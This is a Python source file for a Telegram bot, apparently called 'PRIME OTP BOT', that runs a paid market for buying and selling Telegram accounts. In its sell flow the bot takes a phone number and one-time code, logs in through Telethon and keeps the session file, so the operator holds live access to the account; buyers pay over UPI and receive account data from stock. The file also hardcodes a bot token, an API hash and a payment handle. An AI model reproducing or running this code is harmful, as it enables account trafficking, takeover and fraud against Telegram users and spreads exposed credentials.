import telebot
from telebot import types
from telethon import TelegramClient
import asyncio
import os
import threading
from flask import Flask

# --- WEB SERVER ---
app = Flask('')
@app.route('/')
def home(): return "BOT ACTIVE"
def run(): app.run(host='0.0.0.0', port=8080)
threading.Thread(target=run).start()

# --- CONFIG ---
TOKEN = '8692935006:AAFGFN6aeecPubPdd821zq-CmQnZzMtySsw'
API_ID = 35155488
API_HASH = '9ee6b40363f94481d48dea8a3a871728'
OWNER_ID = 7634311488
LOG_CHANNEL = -1002364843054
CHANNELS = [-1003901746920, -1003897524032]

bot = telebot.TeleBot(TOKEN, parse_mode="Markdown")

# --- DATABASE ---
db = {
    'users': {}, 
    'admins': [OWNER_ID], 
    'upi': 'abhay-op.315@ptyes',
    'stock': {}, 
    'sell_rates': {}, 
    'buy_rates': {},
}
active_logins = {}

if not os.path.exists('sessions'): os.makedirs('sessions')

# --- HELPERS ---
def is_admin(uid): return uid in db['admins'] or uid == OWNER_ID

def check_join(uid):
    for cid in CHANNELS:
        try:
            m = bot.get_chat_member(cid, uid)
            if m.status in ['left', 'kicked']: return False
        except: return False
    return True

def send_log(text):
    try: bot.send_message(LOG_CHANNEL, f"📝 **SYSTEM LOG**\n\n{text}")
    except: pass

def main_menu():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add('💰 BALANCE', '📥 DEPOSIT', '📤 SELL ID', '🛒 BUY ID', '📞 SUPPORT')
    return markup

# --- START ---
@bot.message_handler(commands=['start'])
def start(message):
    uid = message.from_user.id
    if uid not in db['users']: db['users'][uid] = {'balance': 0}
    if not check_join(uid):
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📢 SUPPORT GROUP", url="https://t.me/PRIME_OTP_SUPPORT_GROUP"))
        markup.add(types.InlineKeyboardButton("👤 OWNER", url="https://t.me/god_abhay"))
        markup.add(types.InlineKeyboardButton("✅ CHECK JOIN", callback_data="check_joined"))
        return bot.send_message(message.chat.id, "⚠️ **JOIN CHANNELS FIRST!**", reply_markup=markup)
    bot.send_message(message.chat.id, "🔥 **PRIME OTP BOT READY**", reply_markup=main_menu())

@bot.callback_query_handler(func=lambda call: call.data == "check_joined")
def check_cb(call):
    if check_join(call.from_user.id):
        bot.delete_message(call.message.chat.id, call.message.message_id)
        bot.send_message(call.message.chat.id, "✅ Access Granted!", reply_markup=main_menu())
    else: bot.answer_callback_query(call.id, "❌ Join all first!", show_alert=True)

# --- ADMIN PANEL (FULL FEATURES) ---
@bot.message_handler(commands=['admin'])
def admin_p(message):
    if not is_admin(message.from_user.id): return
    bot.send_message(message.chat.id, 
        "👑 **ADMIN PANEL**\n\n"
        "📈 `/setbuy INDIA 40` - Set Buy Price\n"
        "📉 `/setsell INDIA 25` - Set Sell Price\n"
        "➕ `/addstock INDIA data` - Add Stock\n"
        "❌ `/removestock INDIA` - Clear Stock\n"
        "📜 `/list` - View All Status\n"
        "💳 `/changeupi ID` - Update UPI\n"
        "📢 `/broadcast MSG` - Message to all")

@bot.message_handler(commands=['setbuy', 'setsell', 'addstock', 'removestock', 'list', 'changeupi'])
def admin_logic(message):
    if not is_admin(message.from_user.id): return
    cmd = message.text.split()
    try:
        if '/setbuy' in cmd[0]:
            db['buy_rates'][cmd[1].upper()] = int(cmd[2])
            bot.reply_to(message, f"✅ Buy {cmd[1]} set to {cmd[2]}")
        elif '/setsell' in cmd[0]:
            db['sell_rates'][cmd[1].upper()] = int(cmd[2])
            bot.reply_to(message, f"✅ Sell {cmd[1]} set to {cmd[2]}")
        elif '/addstock' in cmd[0]:
            c = cmd[1].upper()
            if c not in db['stock']: db['stock'][c] = []
            db['stock'][c].append(cmd[2])
            bot.reply_to(message, f"✅ Stock added to {c}")
        elif '/removestock' in cmd[0]:
            db['stock'][cmd[1].upper()] = []
            bot.reply_to(message, f"🗑️ {cmd[1]} Stock cleared.")
        elif '/changeupi' in cmd[0]:
            db['upi'] = cmd[1]
            bot.reply_to(message, f"💳 UPI updated: {cmd[1]}")
        elif '/list' in cmd[0]:
            res = "📊 **SYSTEM STATUS**\n\n"
            for c in db['buy_rates']:
                res += f"🌍 {c} | Buy: ₹{db['buy_rates'][c]} | Stock: {len(db['stock'].get(c, []))}\n"
            bot.send_message(message.chat.id, res if db['buy_rates'] else "No data.")
    except: bot.reply_to(message, "❌ Use: `/command COUNTRY VALUE`")

# --- SELL SYSTEM (ASYNC THREADED) ---
@bot.message_handler(func=lambda m: 'SELL ID' in m.text)
def sell_m(message):
    if not db['sell_rates']: return bot.send_message(message.chat.id, "❌ No rates set.")
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    for c in db['sell_rates']: markup.add(f"SELL {c}")
    markup.add("BACK")
    bot.send_message(message.chat.id, "Select Country:", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text.startswith('SELL '))
def sell_init(message):
    country = message.text.split()[1]
    msg = bot.send_message(message.chat.id, f"📞 Enter {country} number (+...):", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, start_otp_thread, country)

def start_otp_thread(message, country):
    phone = message.text.strip()
    threading.Thread(target=asyncio_run_otp, args=(message.chat.id, phone, country)).start()

def asyncio_run_otp(chat_id, phone, country):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    client = TelegramClient(f"sessions/{phone}", API_ID, API_HASH, loop=loop)
    try:
        loop.run_until_complete(client.connect())
        req = loop.run_until_complete(client.send_code_request(phone))
        active_logins[chat_id] = {'client': client, 'phone': phone, 'hash': req.phone_code_hash, 'loop': loop, 'country': country}
        bot.send_message(chat_id, "📩 **OTP SENT!** Enter code:")
        bot.register_next_step_handler_by_chat_id(chat_id, verify_otp_step)
    except Exception as e: bot.send_message(chat_id, f"❌ Error: {str(e)}")

def verify_otp_step(message):
    otp = message.text.strip()
    d = active_logins.get(message.chat.id)
    if not d: return
    try:
        d['loop'].run_until_complete(d['client'].sign_in(d['phone'], otp, phone_code_hash=d['hash']))
        uid = message.from_user.id
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("✅ APPROVE", callback_data=f"sa_{uid}_{d['country']}_{d['phone']}"))
        for a in db['admins']: bot.send_message(a, f"📦 **SELL REQ**\nUser: `{uid}`\nNum: `{d['phone']}`", reply_markup=markup)
        bot.send_message(message.chat.id, "✅ Verified! Wait for Admin Payment.")
    except: bot.send_message(message.chat.id, "❌ OTP Error.")

# --- DEPOSIT SYSTEM (FIXED) ---
@bot.message_handler(func=lambda m: 'DEPOSIT' in m.text)
def dep_start(message):
    msg = bot.send_message(message.chat.id, "💵 Enter Amount:")
    bot.register_next_step_handler(msg, dep_utr)

def dep_utr(message):
    try:
        amt = int(message.text)
        bot.send_message(message.chat.id, f"💳 Pay: `{db['upi']}`\nSend 12-digit UTR:")
        bot.register_next_step_handler(message, dep_ss, amt)
    except: bot.send_message(message.chat.id, "❌ Invalid.")

def dep_ss(message, amt):
    utr = message.text.strip()
    if len(utr) != 12: return bot.send_message(message.chat.id, "❌ 12 digits required.")
    bot.send_message(message.chat.id, "📸 Send Screenshot:")
    bot.register_next_step_handler(message, dep_final, amt, utr)

def dep_final(message, amt, utr):
    if message.content_type != 'photo': return
    uid = message.from_user.id
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("✅ APPROVE", callback_data=f"da_{uid}_{amt}"), types.InlineKeyboardButton("❌ REJECT", callback_data=f"dr_{uid}"))
    for a in db['admins']: bot.send_photo(a, message.photo[-1].file_id, caption=f"🔔 **DEP REQ**\nUser: `{uid}`\nAmt: {amt}\nUTR: {utr}", reply_markup=markup)
    bot.send_message(message.chat.id, "⏳ Sent to admin.")

# --- BUY SYSTEM ---
@bot.message_handler(func=lambda m: 'BUY ID' in m.text)
def buy_m(message):
    if not db['buy_rates']: return bot.send_message(message.chat.id, "❌ No Stock.")
    markup = types.InlineKeyboardMarkup()
    for c, p in db['buy_rates'].items():
        markup.add(types.InlineKeyboardButton(f"{c} - ₹{p} ({len(db['stock'].get(c, []))} left)", callback_data=f"buy_{c}"))
    bot.send_message(message.chat.id, "Select Country:", reply_markup=markup)

# --- CALLBACK HANDLER ---
@bot.callback_query_handler(func=lambda call: True)
def handle_cb(call):
    p = call.data.split('_')
    if p[0] == 'da':
        uid, amt = int(p[1]), int(p[2])
        db['users'][uid]['balance'] += amt
        bot.send_message(uid, f"✅ ₹{amt} added!")
        bot.edit_message_caption("Approved ✅", call.message.chat.id, call.message.message_id)
        send_log(f"💰 **DEPOSIT**\nUser: `{uid}`\nAmt: ₹{amt}")
    elif p[0] == 'dr':
        bot.send_message(int(p[1]), "❌ Deposit Rejected.")
        bot.edit_message_caption("Rejected ❌", call.message.chat.id, call.message.message_id)
    elif p[0] == 'sa':
        uid, country, phone = int(p[1]), p[2], p[3]
        rate = db['sell_rates'].get(country, 0)
        db['users'][uid]['balance'] += rate
        bot.send_message(uid, f"✅ Sold! ₹{rate} added.")
        bot.edit_message_text(f"Paid ✅", call.message.chat.id, call.message.message_id)
        send_log(f"📤 **SOLD**\nUser: `{uid}`\nPrice: ₹{rate}\nNum: {phone}")
    elif p[0] == 'buy':
        c = p[1]
        uid = call.from_user.id
        price = db['buy_rates'].get(c, 0)
        if db['users'].get(uid, {}).get('balance', 0) < price or not db['stock'].get(c):
            return bot.answer_callback_query(call.id, "Low Stock/Balance!", show_alert=True)
        data = db['stock'][c].pop(0)
        db['users'][uid]['balance'] -= price
        bot.send_message(uid, f"🛒 **BUY SUCCESS!**\n\nID: `{data}`")
        send_log(f"🛒 **BOUGHT**\nUser: `{uid}`\nCountry: {c}")

@bot.message_handler(func=lambda m: 'BALANCE' in m.text)
def bal(message):
    b = db['users'].get(message.from_user.id, {}).get('balance', 0)
    bot.send_message(message.chat.id, f"💳 Balance: ₹{b}")

@bot.message_handler(func=lambda m: 'SUPPORT' in m.text)
def sup(message):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("👤 OWNER", url="https://t.me/god_abhay"),
               types.InlineKeyboardButton("📢 SUPPORT", url="https://t.me/PRIME_OTP_SUPPORT_GROUP"))
    bot.send_message(message.chat.id, "Contact:", reply_markup=markup)

bot.polling(none_stop=True)
